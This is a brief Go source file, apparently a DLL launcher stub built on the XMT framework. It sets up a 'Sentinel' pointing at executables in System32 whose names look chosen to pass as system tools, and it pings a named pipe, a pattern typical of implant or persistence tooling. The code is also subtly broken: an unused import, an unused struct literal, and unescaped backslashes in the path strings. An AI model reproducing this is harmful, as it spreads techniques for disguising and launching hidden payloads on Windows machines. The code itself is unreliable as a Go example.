// +build windows

package main

import (
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/man"
)


func main() {}

//export StartA
func StartA() {

	man.Sentinel{
		Paths: []string{
			"C:\Windows\System32\compmgr.exe",
			"C:\Windows\System32\filtermgr.exe",
		},
	}
	man.Ping("thisisapipe")
}
